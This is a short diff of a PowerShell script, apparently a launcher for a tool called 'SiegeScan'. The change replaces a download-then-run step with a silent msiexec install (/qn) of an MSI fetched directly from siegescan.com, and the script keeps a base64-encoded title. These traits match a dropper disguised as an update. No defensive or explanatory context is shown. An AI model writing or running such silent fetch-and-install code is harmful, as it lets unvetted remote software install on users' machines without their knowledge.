@@ -1,8 +1,5 @@
-$exeUrl = "https://siegescan.com/update.msi"
-$exePath = "$env:TEMP\update.msi"
-
-Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
-Start-Process -FilePath $exePath
+$msiUrl = "https://siegescan.com/update.msi"
+Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$msiUrl`" /qn" -Wait
 
 Clear-Host
 $encodedTitle = "U2llZ2VTY2FuIHYxLjI="
